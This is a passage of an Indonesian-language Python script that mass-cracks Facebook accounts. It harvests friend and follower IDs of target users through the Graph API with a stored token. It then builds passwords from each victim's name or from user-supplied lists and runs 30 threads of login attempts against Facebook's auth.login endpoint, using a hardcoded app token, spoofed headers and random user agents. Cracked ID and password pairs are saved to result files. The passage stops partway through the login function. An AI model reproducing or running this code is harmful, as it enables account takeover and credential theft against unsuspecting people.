		menu()
	elif pilih=="2" or pilih=="02":
		try:
			lisaa = os.listdir("Hasil_Ok")
		except FileNotFoundError:
			jalan(p+"╠══["+h+"[+]"+p+" Direktori Tidak Ditemukan")
			time.sleep(0.5)
			menu()
		if len(lisaa)==0:
			print(p+"║")
			print(p+"╠══["+h+"[+]"+h+" Hasil Ok")
			print(p+"╠══["+h+"[+]"+h+" Tidak Ada Hasil Ok")
			input(p+"╠══["+h+"[+]"+p+" Kembali")
			time.sleep(0.5)
			menu()
		else:
			print(p+"║")
			print(p+"╠══["+h+"[+]"+h+" Hasil Ok")
			for jisoo in lisaa:
				print(p+"╠══["+h+" "+jisoo)
			marjan = input(p+"╠══["+h+" File : "+h+" ")
			try:
				binatang = open("Hasil_Ok/%s"%(marjan))
			except IOError:
				jalan(p+"╠══["+h+"[+]"+m+" Nama File Tidak Ada")
				time.sleep(0.5)
				menu()
		print(""+l)
		bilur = os.system("cd Hasil_Ok && cat %s"%(marjan))
		print(p+"║")
		input(p+"╠══["+h+"[+]"+p+" Kembali")
		time.sleep(0.5)
		menu()
	elif pilih=="0" or pilih=="00":
		menu()
	else:
		jalan(h+"[+]"+p+" Pilihan Anda Invalid")
		time.sleep(0.5)
		result()

# USER AGENT Biar Tap Crott

def user_agent():
	print(p+"║")
	print(p+"╠════════════════════════════════════════════════════")
	print(p+"╠══["+h+"{"+p+"1"+h+"}"+k+" Ganti User Agent")
	print(p+"╠══["+h+"{"+p+"2"+h+"}"+k+" Reset User Agent")
	print(p+"╠══["+h+"{"+p+"3"+h+"}"+k+" Lihat User Agent")
	print(p+"╠════════════════════════════════════════════════════")
	print(p+"║")
	pilih = input(p+"╠══["+p+" pilih : ")
	if pilih=="1" or pilih=="01":
		print(p+"║")
		user = input(p+"╠══["+h+"[+]"+k+" Masukkan User Agent : "+h+" ")
		tulis = open("user.txt","w");tulis.write(user);tulis.close()
		jalan(p+"╠══["+h+"[+]"+k+" Berhasil")
		time.sleep(0.5)
		menu()
	elif pilih=="2" or pilih=="02":
		user = "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"
		tulis = open("user.txt","w");tulis.write(user);tulis.close()
		jalan(p+"╠══["+h+"[+]"+k+" Berhasil")
		time.sleep(0.5)
		menu()
	elif pilih=="3" or pilih=="03":
		try:
			user = open("user.txt","r").read()
		except IOError:
			print(p+"║")
			jalan(p+"╠══["+h+"[+]"+k+" File User Agent Tidak Ada, Silahkan Setting Terlebih Dahulu")
			time.sleep(0.5)
			menu()
			print(p+"║")
		print(p+"╠══["+h+"[+]"+k+" User Agent : "+h+user)
		input(p+"╠══["+h+"[+]"+k+" Kembali")
		menu()
	else:
		jalan(p+"╠══["+h+"[+]"+k+" Masukkan Pilihan Yang Benar")
		time.sleep(0.5)
		user_agent()

# Old2

def dump_old2():
        try:
                token = open("token.txt","r").read()
        except IOError:
                jalan(p+"╠══["+h+"[+]"+k+" Token Kadaluarsa")
                time.sleep(0.5)
                login()
        old_gak.append("old")
        try:
                nada = int(input(p+"╠══["+h+"[+]"+k+" Mau Crack Berapa ID : "))
                print(p+"║")
                if nada>10:
                        jalan(p+"╠══["+h+"[+]"+k+" Maksimal 10 ID")
                        time.sleep(0.5)
                        dump_old2()
        except ValueError:
                jalan(p+"╠══["+h+"[+]"+k+" Input Invalid")
                time.sleep(0.5)
                dump_old2()
        for dot in range(nada):
                dot+=1
                tampung = []
                non_old = []
                uid = input(p+"╠══["+h+"[+]"+k+" Masukkan ID Target Ke %s : "%(dot))
                try:
                        asu = requests.get("https://graph.facebook.com/"+uid+"?access_token="+token)
                        tulul = json.loads(asu.text)
                        print(p+"╠══["+h+"[+]"+k+" Nama : "+tulul["name"])
                except KeyError:
                        print(p+"╠══["+h+"[+]"+k+" ID Salah")
                        time.sleep(0.5)
                        exit()
                except requests.exceptions.ConnectionError:
                        jalan(p+"╠══["+h+"[+]"+k+" Tidak Ada Internet")
                        time.sleep(0.5)
                        exit()
                try:
                        bulu = requests.get("https://graph.facebook.com/"+uid+"/friends?limit=10000&access_token="+token)
                        buriq = json.loads(bulu.text)
                        for cew in buriq["data"]:
                                try:
                                        jamet = cew["id"]
                                        junet = cew["name"]
                                        non_old.append(jamet+"|"+junet)
                                        detec = jamet+"|"+junet
                                        if detec in id:
                                                continue
                                        else:
                                                if len(jamet)==6 or len(jamet)==7 or len(jamet)==8:
                                                        id.append(jamet+"|"+junet)
                                                        tampung.append(jamet+"|"+junet)
                                                        well = open("id.txt","a");well.write(jamet+"\n");well.close()
                                                elif len(jamet)==9:
                                                        id.append(jamet+"|"+junet)
                                                        tampung.append(jamet+"|"+junet)
                                                        well = open("id.txt","a");well.write(jamet+"\n");well.close()
                                                elif len(jamet)==10 and jamet[0]=="1":
                                                        if jamet[1]=="0" or jamet[1]=="1":
                                                                if jamet[2]=="0" or jamet[2]=="1" or jamet[2]=="2":
                                                                        id.append(jamet+"|"+junet)
                                                                        tampung.append(jamet+"|"+junet)
                                                                        well = open("id.txt","a");well.write(jamet+"\n");well.close()
                                                                else:continue
                                                        else:continue
                                                elif len(jamet)==15 and jamet[4]=="0":
                                                        if jamet[5]=="0":
                                                                if jamet[6]=="0" or jamet[6]=="1" or jamet[6]=="2" or jamet[6]=="3" or jamet[6]=="4" or jamet[6]=="5" or jamet[6]=="6" or jamet[6]=="7" or jamet[6]=="8":
                                                                        id.append(jamet+"|"+junet)
                                                                        tampung.append(jamet+"|"+junet)
                                                                        well = open("id.txt","a");well.write(jamet+"\n");well.close()
                                                                else:continue
                                                        else:continue
                                                else:
                                                        continue
                                except:
                                        continue
                        print(p+"╠══["+h+"[+]"+k+" Total ID : "+h+"%s"%(len(non_old)))
                        print(p+"║")
                        print(p+"╠══["+h+"[+]"+k+" Total ID Old : "+h+"%s\n"%(len(tampung)))
                except requests.exceptions.ConnectionError:
                        jalan(p+"╠══["+h+"[+]"+k+" Tidak Ada Internet")
                        time.sleep(0.5)
                        exit()
        print(p+"╠══["+h+"[+]"+k+" Jumlah Total ID Old : "+h+"%s"%(len(id)))
        os.system("rm -rf id.txt")
        mode_password()

# OLD

def dump_old():
        try:
                token = open("token.txt","r").read()
        except IOError:
                jalan(h+"[+]"+k+" Token Kadaluarsa")
                time.sleep(0.5)
                login()
        old_gak.append("old")
        try:
                nada = int(input(p+"╠══["+h+"[+]"+k+" Mau Crack Berapa ID : "))
                print(p+"║")
                if nada>10:
                        jalan(p+"╠══["+h+"[+]"+k+" Maksimal 10 ID")
                        time.sleep(0.5)
                        dump_old()
        except ValueError:
                jalan(p+"╠══["+h+"[+]"+k+" Input Invalid")
                time.sleep(0.5)
                dump_old()
        for dot in range(nada):
                dot+=1
                tampung = []
                non_old = []
                uid = input(p+"╠══["+h+"[+]"+k+" Masukkan ID Target Ke %s : "%(dot))
                try:
                        asu = requests.get("https://graph.facebook.com/"+uid+"?access_token="+token)
                        tulul = json.loads(asu.text)
                        print(p+"╠══["+h+"[+]"+k+" Nama : "+tulul["name"])
                except KeyError:
                        print(p+"╠══["+h+"[+]"+k+" ID Salah")
                        time.sleep(0.5)
                        exit()
                except requests.exceptions.ConnectionError:
                        jalan(p+"╠══["+h+"[+]"+k+" Tidak Ada Internet")
                        time.sleep(0.5)
                        exit()
                try:
                        bulu = requests.get("https://graph.facebook.com/"+uid+"/friends?limit=10000&access_token="+token)
                        buriq = json.loads(bulu.text)
                        for cew in buriq["data"]:
                                try:
                                        jamet = cew["id"]
                                        junet = cew["name"]
                                        non_old.append(jamet+"|"+junet)
                                        detec = jamet+"|"+junet
                                        if detec in id:
                                                continue
                                        else:
                                                if len(jamet)==6 or len(jamet)==7 or len(jamet)==8:
                                                        id.append(jamet+"|"+junet)
                                                        tampung.append(jamet+"|"+junet)
                                                        well = open("id.txt","a");well.write(jamet+"\n");well.close()
                                                elif len(jamet)==9:
                                                        id.append(jamet+"|"+junet)
                                                        tampung.append(jamet+"|"+junet)
                                                        well = open("id.txt","a");well.write(jamet+"\n");well.close()
                                                elif len(jamet)==10 and jamet[0]=="1":
                                                        if jamet[1]=="0" or jamet[1]=="1":
                                                                if jamet[2]=="0" or jamet[2]=="1" or jamet[2]=="2":
                                                                        id.append(jamet+"|"+junet)
                                                                        tampung.append(jamet+"|"+junet)
                                                                        well = open("id.txt","a");well.write(jamet+"\n");well.close()
                                                                else:continue
                                                        else:continue
                                                else:
                                                        continue
                                except:
                                        continue
                        print(p+"╠══["+h+"[+]"+k+" Total ID : "+h+"%s"%(len(non_old)))
                        print(p+"║")
                        print(p+"╠══["+h+"[+]"+k+" Total ID Old : "+h+"%s\n"%(len(tampung)))
                except requests.exceptions.ConnectionError:
                        jalan(p+"╠══["+h+"[+]"+k+" Tidak Ada Internet")
                        time.sleep(0.5)
                        exit()
        print(p+"╠══["+h+"[+]"+k+" Jumlah Total ID Old : "+h+"%s"%(len(id)))
        os.system("rm -rf id.txt")
        mode_password()

# PUBLIK Taik Asu

def publik():
	try:
		token = open("token.txt","r").read()
	except IOError:
		jalan(h+"[+]"+k+" Token Kadaluarsa")
		time.sleep(0.5)
		login()
	uid = input(p+"╠══["+h+"[+]"+k+" Masukkan ID Target : ")
	try:
		asu = requests.get("https://graph.facebook.com/"+uid+"?access_token="+token)
		tulul = json.loads(asu.text)
		print(p+"╠══["+h+"[+]"+k+" Nama : "+tulul["name"])
	except KeyError:
		print(p+"╠══["+h+"[+]"+k+" ID Salah")
		time.sleep(0.5)
		publik()
	except requests.exceptions.ConnectionError:
		jalan(p+"╠══["+h+"[+]"+k+" Tidak Ada Internet")
		time.sleep(0.5)
		exit()
	try:
		bulu = requests.get("https://graph.facebook.com/"+uid+"/friends?limit=10000&access_token="+token)
		buriq = json.loads(bulu.text)
		for cew in buriq["data"]:
			try:
				jamet = cew["id"]
				junet = cew["name"]
				id.append(jamet+"|"+junet)
			except:
				continue
		print(p+"╠══["+h+"[+]"+k+" Total ID : "+h+"%s"%(len(id)))
		print(p+"║")
		mode_password()
	except requests.exceptions.ConnectionError:
		jalan(p+"╠══["+h+"[+]"+k+" Tidak Ada Internet")
		time.sleep(0.5)
		exit()

# FOLLOW (Follow Jga Fb Ama Gh gw suu)

def follow():
	try:
		token = open("token.txt","r").read()
	except IOError:
		jalan(h+"[+]"+k+" Token Kadaluarsa")
		time.sleep(0.5)
		login()
	uid = input(p+"╠══["+h+"[+]"+k+" Masukkan ID Target : ")
	try:
		jumlah = int(input(p+"╠══["+h+"[+]"+k+" Mau Ambil Berapa ID : "))
		if jumlah>5000:
			jalan(p+"╠══["+h+"[+]"+k+" Maksimal 5000 ID")
			time.sleep(0.5)
			follow()
	except ValueError:
		jalan(p+"╠══["+h+"[+]"+m+" Input Invalid")
		time.sleep(0.5)
		follow()
	try:
		asu = requests.get("https://graph.facebook.com/"+uid+"?access_token="+token)
		tulul = json.loads(asu.text)
		print(p+"╠══["+h+"[+]"+p+" Nama : "+tulul["name"])
	except KeyError:
		print(p+"╠══["+h+"[+]"+p+" ID Salah")
		time.sleep(0.5)
		follow()
	except requests.exceptions.ConnectionError:
		jalan(p+"╠══["+h+"[+]"+p+" Tidak Ada Internet")
		time.sleep(0.5)
		exit()
	try:
		bulu = requests.get("https://graph.facebook.com/"+uid+"/subscribers?limit="+str(jumlah)+"&access_token="+token)
		buriq = json.loads(bulu.text)
		for cew in buriq["data"]:
			try:
				jamet = cew["id"]
				junet = cew["name"]
				id.append(jamet+"|"+junet)
			except:
				continue
		print(p+"╠══["+h+"[+]"+p+" Total ID : "+h+"%s"%(len(id)))
		print(p+"║")
		mode_password()
	except requests.exceptions.ConnectionError:
		jalan(p+"╠══["+h+"[+]"+p+" Tidak Ada Internet")
		time.sleep(0.5)
		exit()

# MASSAL

def massal():
	try:
		token = open("token.txt","r").read()
	except IOError:
		jalan(h+"[+]"+k+" Token Kadaluarsa")
		time.sleep(0.5)
		login()
	try:
		nada = int(input(p+"╠══["+h+"[+]"+p+" Mau Crack Berapa ID : "))
		if nada>10:
			jalan(p+"╠══["+h+"[+]"+p+" Maksimal 10 ID")
			time.sleep(0.5)
			massal()
	except ValueError:
		jalan(h+"[+]"+p+" Input Invalid")
		time.sleep(0.5)
		massal()
	for dot in range(nada):
		dot+=1
		tampung = []
		uid = input(p+"╠══["+h+"[+]"+k+" Masukkan ID Target Ke %s : "%(dot))
		try:
			asu = requests.get("https://graph.facebook.com/"+uid+"?access_token="+token)
			tulul = json.loads(asu.text)
			print(p+"╠══["+h+"[+]"+k+" Nama : "+tulul["name"])
		except KeyError:
			print(p+"╠══["+h+"[+]"+k+" ID Salah")
			time.sleep(0.5)
			exit()
		except requests.exceptions.ConnectionError:
			jalan(h+"[+]"+k+" Tidak Ada Internet")
			time.sleep(0.5)
			exit()
		try:
			bulu = requests.get("https://graph.facebook.com/"+uid+"/friends?limit=10000&access_token="+token)
			buriq = json.loads(bulu.text)
			for cew in buriq["data"]:
				try:
					jamet = cew["id"]
					junet = cew["name"]
					detec = jamet+"|"+junet
					if detec in id:
						continue
					else:
						id.append(jamet+"|"+junet)
						tampung.append(jamet+"|"+junet)
				except:
					continue
			print(p+"╠══["+h+"[+]"+k+" Total ID : "+h+"%s\n"%(len(tampung)))
		except requests.exceptions.ConnectionError:
			jalan(h+"[+]"+k+" Tidak Ada Internet")
			time.sleep(0.5)
			exit()
	print(p+"╠══["+h+"[+]"+k+" Jumlah Total ID : "+h+"%s"%(len(id)))
	print(p+"║")
	mode_password()

# MODE PASSWORD

def mode_password():
	mode = input(p+"╠══["+h+"[+]"+k+" Crack Password Default Or Manual Or Gabungkan "+s+"{"+u+"d/m/g"+s+"}"+l+" : ")
	if mode=="d" or mode=="D":
		opsi()
	elif mode=="m" or mode=="M":
		print(p+"╠══["+h+"[+]"+k+" Masukkan Password Manual")
		print(p+"║")
		print(p+"╠══[ Miniman 6 Karakter Dalam 1 Password")
		print(p+"╠══[ Contoh : "+k+"sayang,bismillah,katasandi")
		pwa = input(p+"╠══["+h+"[+]"+k+" Password Manual : "+h+"")
		cewe = pwa.split(",")
		if len(cewe)>7:
			jalan("\n"+balmond+m+" Jangan Serakah Bang, Minimal 7 Password Aja")
			time.sleep(0.5)
			exit()
		for cowok in cewe:
			if len(cowok)==1 or len(cowok)==2 or len(cowok)==3 or len(cowok)==4 or len(cowok)==5:
				jalan("\n"+balmond+m+" Dalam 1 Password Minimal 6 Karakter")
				time.sleep(0.5)
				exit()
		sandi.append(pwa)
		opsi2()
	elif mode=="g" or mode=="G":
		print(p+"╠══["+h+"[+]"+k+" Masukkan Password Tambahan")
		print(p+"║")
		print(p+"╠══[ Miniman 6 Karakter Dalam 1 Password")
		print(p+"╠══[ Contoh : "+k+"sayang,bismillah,katasandi")
		pwa = input(p+"╠══["+h+"[+]"+k+" Password Tambahan : "+h+"")
		cewe = pwa.split(",")
		if len(cewe)>5:
			jalan("\n"+balmond+m+" Jangan Serakah Bang, Minimal 5 Password Aja")
			time.sleep(0.5)
			exit()
		for cowok in cewe:
			if len(cowok)==1 or len(cowok)==2 or len(cowok)==3 or len(cowok)==4 or len(cowok)==5:
				jalan("\n"+balmond+m+" Dalam 1 Password Minimal 6 Karakter")
				time.sleep(0.5)
				exit()
		sandi.append(pwa)
		opsi3()
	else:
		jalan(p+"╠══["+h+"[+]"+k+" Pilih d Atau m Atau g")
		time.sleep(0.5)
		mode_password()

# OPSI

def opsi():
	ops = input(p+"╠══["+h+"[+]"+k+" Munculkan Opsi "+h+"{"+k+"y/t"+h+"}"+l+" : ")
	print(p+"║")
	if ops=="y" or ops=="Y":
		opsit.append("munculkan")
	elif ops=="t" or ops=="T":
		opsit.append("jangan")
	else:
		jalan(p+"╠══["+h+"[+]"+k+" Pilih Ya Atau Tidak")
		time.sleep(0.5)
		opsi()
	mode_crack()

# OPSI2

def opsi2():
        ops = input(p+"╠══["+h+"[+]"+k+" Munculkan Opsi "+h+"{"+k+"y/t"+h+"}"+l+" : ")
        print(p+"║")
        if ops=="y" or ops=="Y":
                opsit.append("munculkan")
        elif ops=="t" or ops=="T":
                opsit.append("jangan")
        else:
                jalan(p+"╠══["+h+"[+]"+k+" Pilih Ya Atau Tidak")
                time.sleep(0.5)
                opsi2()
        mode_crack2()

# OPSI3

def opsi3():
        ops = input(p+"╠══["+h+"[+]"+k+" Munculkan Opsi "+h+"{"+k+"y/t"+h+"}"+l+" : ")
        print(p+"║")
        if ops=="y" or ops=="Y":
                opsit.append("munculkan")
        elif ops=="t" or ops=="T":
                opsit.append("jangan")
        else:
                jalan(p+"╠══["+h+"[+]"+k+" Pilih Ya Atau Tidak")
                time.sleep(0.5)
                opsi3()
        mode_crack3()

# MODE CRACK

def mode_crack():
	print(p+"╠══["+h+"{"+p+"1"+h+"}"+k+" Method Api "+p+"{"+h+"Fast"+p+"}")
	print(p+"╠══["+h+"{"+p+"2"+h+"}"+k+" Method Mbasic "+p+"{"+h+"Slow"+p+"}")
	print(p+"║")
	pilih = input(p+"╠══["+h+"[+]"+k+" Pilih : ")
	if pilih=="1" or pilih=="01":
		print(p+"║")
		print(p+"╠══["+h+"[+]"+k+" Tekan "+h+"'y'"+k+" Jika Ingin Menggunakan Random User Agent")
		print(p+"╠══["+h+"[+]"+k+" Tekan "+p+"Enter"+k+" Jika Tidak Ingin Menggunakan Random User Agent")
		agenku = input(p+"╠══["+h+"[+]"+k+" Gunakan User Agent Random "+s+"{"+u+"Recomended"+s+"}"+l+" : ")
		if agenku=="y" or agenku=="Y":
			random_gak.append("random")
		else:
			kopi = "enak"
			print(p+"║")
		print(p+"╠══["+h+"[+]"+k+" Crack Dimulai")
		print(p+"╠══["+h+"[+]"+k+" Jika Tidak Ada Hasil, Hidupkan Mode Pesawat 5 Detik\n")
		default()
	elif pilih=="2" or pilih=="02":
		print(p+"║")
		print(p+"╠══["+h+"[+]"+k+" Tekan "+h+"'y'"+k+" Jika Ingin Menggunakan Random User Agent")
		print(p+"╠══["+h+"[+]"+k+" Tekan "+p+"Enter"+k+" Jika Tidak Ingin Menggunakan Random User Agent")
		agenku = input(p+"╠══["+h+"[+]"+k+" Gunakan User Agent Random "+s+"{"+u+"Recomended"+s+"}"+l+" : ")
		if agenku=="y" or agenku=="Y":
			random_gak.append("random")
		else:
			kopi = "enak"
			print(p+"║")
		print(p+"╠══["+h+"[+]"+k+" Crack Dimulai")
		print(p+"╠══["+h+"[+]"+k+" Jika Tidak Ada Hasil, Hidupkan Mode Pesawat 5 Detik\n")
		default2()
	else:
		jalan(p+"╠══["+h+"[+]"+k+" Pilihan Invalid")
		time.sleep(0.5)
		mode_crack()

# MODE CRACK2

def mode_crack2():
        print(p+"╠══["+h+"{"+p+"1"+h+"}"+k+" Method Api "+p+"{"+h+"Fast"+p+"}")
        print(p+"╠══["+h+"{"+p+"2"+h+"}"+k+" Method Mbasic "+p+"{"+h+"Slow"+p+"}")
        print(p+"║")
        pilih = input(p+"╠══["+h+"[+]"+k+" Pilih : ")
        if pilih=="1" or pilih=="01":
                print(p+"╠══["+h+"[+]"+k+" Tekan "+h+"'y'"+k+" Jika Ingin Menggunakan Random User Agent")
                print(p+"╠══["+h+"[+]"+k+" Tekan "+p+"Enter"+k+" Jika Tidak Ingin Menggunakan Random User Agent")
                agenku = input(p+"╠══["+h+"[+]"+k+" Gunakan User Agent Random "+s+"{"+u+"Recomended"+s+"}"+l+" : ")
                if agenku=="y" or agenku=="Y":
                        random_gak.append("random")
                else:
                        kopi = "enak"
                        print(p+"║")
                print(p+"╠══["+h+"[+]"+k+" Crack Dimulai")
                print(p+"╠══["+h+"[+]"+k+" Jika Tidak Ada Hasil, Hidupkan Mode Pesawat 5 Detik\n")
                manual()
        elif pilih=="2" or pilih=="02":
                print(p+"╠══["+h+"[+]"+k+" Tekan "+h+"'y'"+k+" Jika Ingin Menggunakan Random User Agent")
                print(p+"╠══["+h+"[+]"+k+" Tekan "+p+"Enter"+k+" Jika Tidak Ingin Menggunakan Random User Agent")
                agenku = input(p+"╠══["+h+"[+]"+k+" Gunakan User Agent Random "+s+"{"+u+"Recomended"+s+"}"+l+" : ")
                if agenku=="y" or agenku=="Y":
                        random_gak.append("random")
                else:
                        kopi = "enak"
                        print(p+"║")
                print(p+"╠══["+h+"[+]"+k+" Crack Dimulai")
                print(p+"╠══["+h+"[+]"+k+" Jika Tidak Ada Hasil, Hidupkan Mode Pesawat 5 Detik\n")
                manual2()
        else:
                jalan(p+"╠══["+h+"[+]"+k+" Pilihan Invalid")
                time.sleep(0.5)
                mode_crack2()

# MODE CRACK3

def mode_crack3():
        print(p+"╠══["+h+"{"+p+"1"+h+"}"+k+" Method Api "+p+"{"+h+"Fast"+p+"}")
        print(p+"╠══["+h+"{"+p+"2"+h+"}"+k+" Method Mbasic "+p+"{"+h+"Slow"+p+"}")
        print(p+"║")
        pilih = input(p+"╠══["+h+"[+]"+k+" Pilih : ")
        if pilih=="1" or pilih=="01":
                print(p+"╠══["+h+"[+]"+k+" Tekan "+h+"'y'"+k+" Jika Ingin Menggunakan Random User Agent")
                print(p+"╠══["+h+"[+]"+k+" Tekan "+p+"Enter"+k+" Jika Tidak Ingin Menggunakan Random User Agent")
                agenku = input(p+"╠══["+h+"[+]"+k+" Gunakan User Agent Random "+s+"{"+u+"Recomended"+s+"}"+l+" : ")
                if agenku=="y" or agenku=="Y":
                        random_gak.append("random")
                else:
                        kopi = "enak"
                        print(p+"║")
                print(p+"╠══["+h+"[+]"+k+" Crack Dimulai")
                print(p+"╠══["+h+"[+]"+k+" Jika Tidak Ada Hasil, Hidupkan Mode Pesawat 5 Detik\n")
                gabungkan()
        elif pilih=="2" or pilih=="02":
                print(p+"╠══["+h+"[+]"+k+" Tekan "+h+"'y'"+k+" Jika Ingin Menggunakan Random User Agent")
                print(p+"╠══["+h+"[+]"+k+" Tekan "+p+"Enter"+k+" Jika Tidak Ingin Menggunakan Random User Agent")
                agenku = input(p+"╠══["+h+"[+]"+k+" Gunakan User Agent Random "+s+"{"+u+"Recomended"+s+"}"+l+" : ")
                if agenku=="y" or agenku=="Y":
                        random_gak.append("random")
                else:
                        kopi = "enak"
                        print(p+"║")
                print(p+"╠══["+h+"[+]"+k+" Crack Dimulai")
                print(p+"╠══["+h+"[+]"+k+" Jika Tidak Ada Hasil, Hidupkan Mode Pesawat 5 Detik\n")
                gabungkan2()
        else:
                jalan(p+"╠══["+h+"[+]"+k+" Pilihan Invalid")
                time.sleep(0.5)
                mode_crack3()


# DEFAULT

def default():
	loop = 0
	with ThreadPoolExecutor(max_workers=30) as kintil:
		for yf in id:
			idd, namee = yf.split("|")
			loop+=1
			past = []
			for xr in namee.split(" "):
				if len(xr)<3:
					continue
				else:
					xr = xr.lower()
					if len(xr)==3 or len(xr)==4 or len(xr)==5:
						past.append(xr+"123")
						past.append(xr+"1234")
						past.append(xr+"12345")
						past.append(xr)
					else:
						past.append(xr+"123")
						past.append(xr+"1234")
						past.append(xr+"12345")
						past.append(xr)
			past.append(namee.lower())
			kintil.submit(api, idd, past, loop)

# DEFAULT2

def default2():
        loop = 0
        with ThreadPoolExecutor(max_workers=30) as kintil:
                for yf in id:
                        idd, namee = yf.split("|")
                        loop+=1
                        past = []
                        for xr in namee.split(" "):
                                if len(xr)<3:
                                        continue
                                else:
                                        xr = xr.lower()
                                        if len(xr)==3 or len(xr)==4 or len(xr)==5:
                                                past.append(xr+"123")
                                                past.append(xr+"1234")
                                                past.append(xr+"12345")
                                                past.append(xr)
                                        else:
                                                past.append(xr+"123")
                                                past.append(xr+"1234")
                                                past.append(xr+"12345")
                                                past.append(xr)
                        past.append(namee.lower())
                        kintil.submit(mbasic, idd, past, loop)

# MANUAL

def manual():
        loop = 0
        with ThreadPoolExecutor(max_workers=30) as kintil:
                for yf in id:
                        idd, namee = yf.split("|")
                        loop+=1
                        past = []
                        for wl in sandi:
                                wl = wl.lower()
                                for aj in wl.split(","):
                                        past.append(aj)
                        kintil.submit(api, idd, past, loop)

# MANUAL2

def manual2():
        loop = 0
        with ThreadPoolExecutor(max_workers=30) as kintil:
                for yf in id:
                        idd, namee = yf.split("|")
                        loop+=1
                        past = []
                        for wl in sandi:
                                wl = wl.lower()
                                for aj in wl.split(","):
                                        past.append(aj)
                        kintil.submit(mbasic, idd, past, loop)

# GABUNG

def gabungkan():
	loop = 0
	with ThreadPoolExecutor(max_workers=30) as kintil:
		for yf in id:
			idd, namee = yf.split("|")
			loop+=1
			past = []
			for xr in namee.split(" "):
				if len(xr)<3:
					continue
				else:
					xr = xr.lower()
					if len(xr)==3 or len(xr)==4 or len(xr)==5:
						past.append(xr+"123")
						past.append(xr+"1234")
						past.append(xr)
					else:
						past.append(xr+"123")
						past.append(xr+"1234")
						past.append(xr+"12345")
						past.append(xr)
			past.append(namee.lower())
			for cicak in sandi:
				cicak = cicak.lower()
				for semut in cicak.split(","):
					past.append(semut)
			kintil.submit(api, idd, past, loop)

# GABUNGKAN2

def gabungkan2():
	loop = 0
	with ThreadPoolExecutor(max_workers=30) as kintil:
		for yf in id:
			idd, namee = yf.split("|")
			loop+=1
			past = []
			for xr in namee.split(" "):
				if len(xr)<3:
					continue
				else:
					xr = xr.lower()
					if len(xr)==3 or len(xr)==4 or len(xr)==5:
						past.append(xr+"123")
						past.append(xr+"1234")
						past.append(xr)
					else:
						past.append(xr+"123")
						past.append(xr+"1234")
						past.append(xr+"12345")
						past.append(xr)
			past.append(namee.lower())
			for cicak in sandi:
				cicak = cicak.lower()
				for semut in cicak.split(","):
					past.append(semut)
			kintil.submit(mbasic, idd, past, loop)

# CRACK API

def api(uid,pwx,loop):
	ua = "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"
	ini_persen = float(loop)*100
	persennya = float(ini_persen)/float(len(id))
	persenku = str(persennya).split(".")
	npc = persenku[1]
	if len(npc)==1 and npc=="0":
		persen = persenku[0]+"%"
	else:
		if len(npc)==1:
			persen = persenku[0]+"."+npc+"%"
		else:
			persen = persenku[0]+"."+npc[0]+npc[1]+"%"
	loliku = datetime.now()
	minit = loliku.minute
	ditik = loliku.second
	if loop==35 or loop==45:
		semoga.append(str(minit)+","+str(ditik))
	if loop==47:
		mulai,selesai = semoga[0],semoga[1]
		tikung = mulai.split(",")
		modal = selesai.split(",")
		if tikung[0]==modal[0]:
			det = float(modal[1])-float(tikung[1])
		else:
			mixer = float(modal[0])-float(tikung[0])
			mixing = mixer*60.0
			durian = 60.0-float(tikung[1])+float(modal[1])
			det = mixing+durian
		if det==0.0:
			nihh = det+0.7
			berapa_d.append(nihh)
		else:
			berapa_d.append(det)
	else:
		det = "-"
	if len(berapa_d)==0:
		dett = "-"
	else:
		for angka in berapa_d:
			hitt = float(angka)/10
			hutt = len(id)-loop
			dutt = hitt*hutt
			dott = str(dutt)
			ditt = dott.split(".")
			if dutt>3599:
				cutt = dutt/3600.0
				jutt = str(cutt).split(".")
				jitt = jutt[1]
				if len(jutt[1])==1 and jutt[1]=="0":
					dett = jutt[0]+"j"
				else:
					dett = jutt[0]+"."+jitt[0]+"j"
			elif dutt>59 and dutt<3600:
				cutt = dutt/60.0
				jutt = str(cutt).split(".")
				jitt = jutt[1]
				if len(jutt[1])==1 and jutt[1]=="0":
					dett = jutt[0]+"m"
				else:
					dett = jutt[0]+"."+jitt[0]+"m"
			elif dutt>0 and dutt<60:
				dett = ditt[0]+"d"
	print(s+"\r{"+u+"Ndrii"+s+"} "+l+"%s/%s OK:%s CP:%s %s[%s%s%s] [%s%s%s]"%(loop,len(id),len(ok),len(cp),h,k,persen,h,k,dett,h), end=' ');sys.stdout.flush()
	ses = requests.Session()
	for pw in pwx:
		try:
			headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
			api = 'https://b-api.facebook.com/method/auth.login'
			params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
			response = requests.get(api, params=params, headers=headers_)
			if 'access_token' in response.text and 'EAAA' in response.text:
				if "old" in old_gak:
					if len(uid)==6:
						tahunnya = joined_year[0]
					elif len(uid)==7:
						tahunnya = joined_year[1]
					elif len(uid)==8:
						tahunnya = joined_year[2]
					elif len(uid)==9:
						tahunnya = joined_year[3]
					elif len(uid)==10:
						tahunnya = joined_year[4]
					elif len(uid)==15:
						tahunnya = joined_year[5]
					print(h+"\r{"+k+"ok"+h+"}"+h+" "+uid+k+" >< "+h+pw+k+" >< "+h+tahunnya+"          ")
					bts = open("Hasil_Ok/OK_%s.txt"%(hck),"a");bts.write(uid+">"+pw+"\n");bts.close()
					ok.append(uid+"|"+pw)
				else:
					print(h+"\r{"+k+"ok"+h+"}"+h+" "+uid+k+" >< "+h+pw+k+" >< "+h+response.json()["access_token"])
					bts = open("Hasil_Ok/OK_%s.txt"%(hck),"a");bts.write(uid+">"+pw+"\n");bts.close()
					ok.append(uid+"|"+pw)
				break
			elif 'www.facebook.com' in response.json()['error_msg']:
				if len(uid)==6:
					tahunnya = joined_year[0]
				elif len(uid)==7:
					tahunnya = joined_year[1]
				elif len(uid)==8:
					tahunnya = joined_year[2]
				elif len(uid)==9:
